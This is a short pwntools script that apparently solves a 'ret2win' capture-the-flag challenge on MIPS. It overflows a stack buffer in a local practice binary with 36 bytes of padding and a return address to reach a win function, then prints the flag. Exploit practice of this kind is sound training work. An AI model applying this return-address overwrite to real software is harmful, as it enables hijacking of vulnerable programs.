from pwn import *

win = 0x00400a00

payload = b"".join([
    b"A"*(32+4),
    p32(win),
])

#p = process(["qemu-mipsel", "-g", "1234", "./ret2win_mipsel"])
p = process("./ret2win_mipsel")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"flag:\n")
flag = p.recvuntil(b"}\n")
print(f"Flag : {flag}")
p.close()
